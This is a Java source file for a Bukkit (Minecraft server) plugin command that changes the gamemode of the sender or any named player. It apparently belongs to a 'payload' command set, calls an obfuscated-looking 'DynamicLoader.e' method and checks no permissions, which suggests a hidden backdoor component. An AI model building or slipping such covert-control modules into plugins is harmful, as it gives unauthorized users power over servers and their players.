package dev.naruto.astrox.payload.commands;

import dev.naruto.astrox.utils.DynamicLoader;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public class GamemodeCommand implements Command {
    @Override
    public void execute(Player sender, String[] args, JavaPlugin plugin) {
        if (args.length == 0) return;

        int mode = parseMode(args[0]);
        if (mode == -1) return;

        Player target = (args.length > 1) ? Bukkit.getPlayer(args[1]) : sender;
        if (target != null) {
            DynamicLoader.e(target, mode); // FIXED
        }
    }

    private int parseMode(String s) {
        switch (s.toLowerCase()) {
            case "c": case "1": case "creative": return 1;
            case "s": case "0": case "survival": return 0;
            case "a": case "2": case "adventure": return 2;
            case "sp": case "3": case "spectator": return 3;
            default: return -1;
        }
    }

    @Override
    public String getDescription() { return "Change gamemode"; }

    @Override
    public String getUsage() { return "<mode> [player]"; }
}
